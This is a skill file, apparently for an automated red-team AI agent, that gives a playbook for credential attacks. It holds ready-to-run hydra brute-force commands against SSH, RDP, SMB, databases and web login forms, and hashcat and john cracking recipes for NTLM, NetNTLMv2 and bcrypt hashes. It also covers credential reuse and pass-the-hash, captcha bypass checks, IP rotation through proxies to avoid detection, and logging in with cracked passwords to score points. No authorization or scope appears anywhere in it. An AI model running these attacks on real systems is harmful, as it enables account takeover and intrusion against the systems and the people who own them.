---
name: credential-attack
description: [Internal] Credential attack: online weak-password brute force (hydra) and offline hash cracking (hashcat/john), covering SSH/FTP/RDP/SMB/databases/Web backends
whenToUse: When a login entry point is found (Web backend/SSH/FTP/RDP/SMB/MySQL/MSSQL/Redis) and passwords must be tried; or a hash/ciphertext is held and the plaintext must be recovered
role: exploit
category: Internal
tags: [credential, bruteforce, hash]
enabled: true
---

# Credential Attack (online brute force + offline cracking)

One of the two most reliable ways to "obtain account privileges" in red teaming (the other is plaintext pulled from configuration/source-code leaks).
**This skill only gets the password guessed out**; after guessing it you must use the skills `browser-automation` / `kimi-webbridge` to
**log in once in a real browser** before it counts as obtained account privileges (red line: credentials alone are not an account).

## Local tools

| Tool | Path | Version | Purpose |
| --- | --- | --- | --- |
| **hydra** | `/usr/bin/hydra` | 9.7 | Online brute force, 50+ protocols |
| **hashcat** | `/usr/bin/hashcat` | 7.1.2 | Offline hash cracking (GPU/CPU) |
| **john** | `/usr/sbin/john` | — | Offline cracking (auto format detection, simple config) |

Wordlists: `/usr/share/wordlists/` (contains `rockyou.txt`, needs gunzip), `/usr/share/seclists/Passwords/`.
**If rockyou is missing, decompress it first**: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` (requires authorization; if unavailable use one from seclists).

## 1. Online brute force (hydra)

### General syntax
```bash
hydra -L users.txt -P pass.txt <protocol>://<target>[:port] [module args] -t <concurrency> -f -o runs/hydra-<target>.txt
```
- `-L` username wordlist / `-l` single username; `-P` password wordlist / `-p` single password
- `-t` concurrency (**default 16, do not exceed 16**, most services will lock accounts or ban the IP)
- `-f` stop after the first hit (avoid locking out the account)
- `-o` output to `runs/` (the report needs it to reproduce)
- `-V` show every attempt (for debugging; do not enable on a live run)

### Per-protocol examples
```bash
# SSH
hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f -o runs/hydra-ssh-10.0.0.5.txt

# RDP (note: concurrency must be low, Windows will lock the account)
hydra -L users.txt -P pass.txt rdp://10.0.0.6 -t 2 -f -o runs/hydra-rdp-10.0.0.6.txt

# SMB
hydra -L users.txt -P pass.txt smb://10.0.0.7 -t 4 -f

# FTP
hydra -L users.txt -P pass.txt ftp://10.0.0.8 -t 6 -f

# MySQL
hydra -L users.txt -P pass.txt mysql://10.0.0.9 -t 4 -f

# MSSQL
hydra -L users.txt -P pass.txt mssql://10.0.0.10 -t 4 -f

# Web form login (POST) — the most common case
hydra -L users.txt -P pass.txt target.example.com http-post-form \
  "/admin/login.jsp:username=^USER^&password=^PASS^:F=invalid username or password" -t 8 -f -o runs/hydra-web-admin.txt

# Web form (with extra headers/HTTPS)
hydra -L users.txt -P pass.txt -s 443 -S target.example.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=invalid:H=Cookie: JSESSIONID=xxx" -t 8 -f
```

### Success/failure determination for Web form brute force (critical)
The third segment of `http-post-form` has the format `"<path>:<POST body>:<failure condition>"`, and **the failure condition must be written accurately**, otherwise the whole run produces false positives:
- `F=<failure marker string>`: the string appearing in the response means **failure** (recommended, most reliable)
- `S=<success marker string>`: the string appearing in the response means **success** (use when there is no uniform failure text)
- First send two manual requests (one wrong password vs one correct password, or compare against a non-existent user) to **confirm the marker string is unique**, then run the brute force.
- With a captcha / image code / slider: first check whether it can be bypassed (fixed captcha, captcha not validated, front-end-only validation); if it cannot be bypassed **do not force the brute force** (the skill `browser-automation` can do a limited number of captcha-bearing attempts instead) — switch to another path.

### Wordlist priority (the key to saving time)
1. **Small targeted wordlist** (highest hit rate): combinations of organisation name/brand/domain/year, e.g. `OrgShortName@2026`, `Admin@123`, `<domain>2026`;
   build them on the fly from the title/organisation info in `redteam_asset_query`.
2. **Default credential wordlist**: product defaults (`admin/admin`, `tomcat/tomcat`, `weblogic/weblogic1`, `sa/sa`),
   see the nuclei templates under `http/default-logins/` (307 of them); **check `redteam_poc_search` first**.
3. **Common weak password TOP lists**: the 10-million / top-100 lists under `/usr/share/seclists/Passwords/Common-Credentials/`.
4. General large wordlists (rockyou) last — slow and noisy.

### Where usernames come from
- Web backend: error messages, default accounts in JS, `createBy` returned by APIs, login page hints, `robots.txt`, employee email prefixes;
- When directory brute force hits `/admin`, try `admin`, `administrator`, `system`, `test`, `guest` first;
- After obtaining one credential, go for **credential reuse** (see below) — far faster than brute force.

## 2. Offline cracking (hashcat / john)

Once you have hashes/ciphertext (databases, config files, `/etc/shadow`, web application databases), run them offline — **no traffic is generated on the target side**, much safer than online brute force.

```bash
# 1) Identify the hash type first
hashcat --identify hashes.txt

# 2) NTLM (Windows)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3

# 3) NetNTLMv2 (captured by Responder)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# 4) MD5 / SHA1 (web application databases)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt

# 5) bcrypt (WordPress / PHP)
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

# 6) Add rules (amplify the wordlist 10x — the best value for effort)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 7) Mask brute force (known password policy, e.g. 8 digits + uppercase letter)
hashcat -m 1000 hashes.txt -a 3 '?u?l?l?l?l?d?d?d?d'
```

```bash
# john: format detection saves hassle, config in ~/.john/john.conf
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

**Note**: this machine may have no GPU, so `hashcat` on CPU will be slow — prefer rules + a small wordlist, or save the hashes to `runs/` for later processing;
**do not burn hours on cracking**; if it will not crack, use the hash directly (Pass-the-Hash, see skill `lateral-movement`).

## 3. Credential reuse (far faster than brute force — do this first)

After obtaining any set of credentials, **try them laterally first**; do not rush to brute-force the next one:
1. Use `redteam_credential_list` to see existing credentials (including username/password/source);
2. Try the same password on: other instances of the same product, management interfaces of other assets, SSH/RDP/SMB/databases, VPN/bastion host/ops platforms;
3. Use username patterns (`first.last`, employee ID, email prefix) with known passwords to try other users on the same system;
4. Reuse hashes directly: PtH / Pass-the-Key (skill `lateral-movement`).

## 4. Discipline and boundaries (mandatory)

1. **Check the store first**: `redteam_credential_list` / `redteam_asset_query` — do not brute-force the same entry point twice (for entries with `blocked_count>0`, check the reason first).
2. **Account lockout risk**: Windows (RDP/SMB) and OA/domain accounts **strictly rate-limited**: `-t 2` (Windows), `-t 4` (SSH/FTP),
   wordlists no larger than the hundreds; **stop after 5 consecutive failures on the same account**, switch accounts or targets — locking an account destroys the entry point.
3. **Abandon after the same target is blocked >3 times cumulatively** (`redteam_asset_test` status=abandoned + blocked=true).
4. **Reduce noise via proxies**: for Web form brute force use the skill `cn-proxy-pool` to change the egress IP; for intranet targets route through a suo5 tunnel.
5. **Prefer fscan on the intranet**: hand intranet-wide weak-password sweeps to the skill `fscan-intranet` (batch brute force of 28 service types, results in one pass);
   use hydra for protocols fscan does not cover or for single points that need fine-grained control.

## 5. Output and persistence (mandatory)

1. **On every hit, immediately call `redteam_credential_add`**:
   - `username`, **write the plaintext into `secret_value`** (displayed directly in the panel, convenient for reuse at any time), `source` (`weak password`/`default credential`/`credential reuse`/`leak`/`offline crack`),
     `tool` (the actual command as written, e.g. `hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f`), `secret_ref` (evidence file path such as `runs/hydra-ssh-10.0.0.5.txt`).
2. **Only a real login test scores**: for Web backends use `browser-automation` / `kimi-webbridge` to log in once for real
   (open the login page → fill in the account and password → confirm you are inside the backend → record page title/menu/current username → capture the Cookie as evidence) →
   `redteam_access_add` (`method=web-login`) → `redteam_score_hit` (`web-app` 10 points / `web-app` 20 points,
   `evidence` written as "asset | backend administrator tomcat/Tomcat@2024").
   **If login fails, record one line in the `test` of `redteam_asset_test` describing the blocker** (hash uncracked/second factor required/source IP restricted/account disabled); no score.
3. **Account privileges are capped per service**: the same asset on the same port scores only once; obtaining administrator = full score for that service — do not farm multiple accounts on the same service.
4. When scoring, put the actual command/output into the `command`/`result` of `redteam_score_hit`; there is no need to write a separate chain.
   `tool` holds the actual command, `result` holds the output summary (e.g. `ssh 10.0.0.5 logged in as root/Root@123, uid=0(root)`).
5. Hash files and cracking results always go into `runs/`.
